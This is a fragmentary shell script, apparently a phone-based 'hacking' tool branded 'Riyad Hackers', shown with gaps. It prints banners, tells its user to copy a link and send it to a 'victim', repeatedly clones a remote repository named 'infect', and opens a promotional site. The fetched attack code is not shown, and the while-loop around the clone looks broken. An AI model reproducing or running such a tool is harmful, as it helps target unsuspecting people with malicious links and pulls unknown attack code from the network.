...
echo -e "$red                      ⫸$ylo  Riyad Hackers$red ⫷$rset"
echo 
# Functions
...
echo -e '\e[92m 
                   ...
                   (_)\_)(_____) (__) (____) '
echo " "
echo -e "\e[91m R+S Copy below link and send it your victim and 
...
while git clone https://github.com/Carzy924/infect 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
...
if [ "$p" = "y" ];
then
am start -a android.intent.action.VIEW -d https://riyadhacktube.com 2>/dev/null
clear
baner1
menu
elif [ "$p" = "t" ];
